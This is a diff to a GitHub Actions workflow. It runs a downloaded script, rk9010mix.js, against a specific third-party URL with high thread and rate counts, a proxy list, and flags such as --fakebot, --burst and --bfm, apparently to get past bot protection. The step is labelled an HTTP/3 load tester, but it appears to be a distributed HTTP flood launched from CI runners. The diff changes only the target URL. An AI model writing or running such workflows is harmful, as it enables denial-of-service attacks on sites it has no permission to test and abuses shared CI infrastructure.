@@ -36,7 +36,7 @@ jobs:
           
       
       - name: Install Node.js dependencies
-        run: npm install  p-limit hpack tls http2 dns tls cluster v8 colors zlib chalk
+        run: npm install p-limit colors chalk hpack
             
       - name: Run HTTP/3 load tester
         run: |
@@ -45,7 +45,7 @@ jobs:
           unzip Fc-main.zip
           cd Fc-main
           
-          node rk9010mix.js https://rapidis.gay/6901966783-767ff9c4-4c80-484a-8a93-0fb8d84ac239 250 400 2 proxy.txt --full --close --burst --randrate --fakebot --http 2 --ram 100 --streams 290 --direct --bfm --table 65536 --window 8388608
+          node rk9010mix.js https://rapidis.gay/6901966783-47501275-891c-4964-ab2a-bebe7635ad07 250 400 2 proxy.txt --full --close --burst --randrate --fakebot --http 2 --ram 100 --streams 290 --direct --bfm --table 65536 --window 8388608
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
